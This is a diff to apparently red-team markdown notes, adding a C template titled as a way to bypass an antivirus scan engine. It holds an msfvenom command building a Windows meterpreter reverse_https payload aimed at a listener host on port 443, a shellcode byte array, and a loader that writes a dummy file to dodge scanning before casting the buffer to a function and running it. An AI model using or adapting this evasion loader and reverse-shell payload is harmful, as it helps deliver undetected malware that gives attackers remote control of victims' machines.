@@ -152,6 +152,52 @@ The above string can be obfuscated using **powershell escape caracters** ` and +
 
 <br /><br /><br />
 
+
+
+
+## bypass the scan engine (avet) template.c
+
+      #include <stdio.h>
+      #include <stdlib.h>
+      #include <unistd.h>
+      #include <string.h>
+      #include <windows.h>
+      #include <tchar.h>
+      #include <stdlib.h>
+      #include <strsafe.h>
+
+      void exec_shellcode(unsigned char *shellcode)
+      {
+        int (*funct)();
+        funct = (int (*)()) shellcode;
+        (int)(*funct)();
+      }
+
+
+      int main (int argc, char **argv)
+      {
+      /*
+      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
+      */
+
+      unsigned char buffer[]= 
+      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
+      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
+      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
+      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
+	
+      /*
+      Here is the bypass. A file is written, this bypasses the scan engine
+      */
+        HANDLE hFile;
+	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) 
+		exit(0);
+
+	exec_shellcode(buffer);
+      }
+
+
 **Author: @r00t-3xp10it**<br />
 **Special Thanks to: @Wandoelmo Silva**<br />
 # Suspicious Shell Activity (red team) @2018
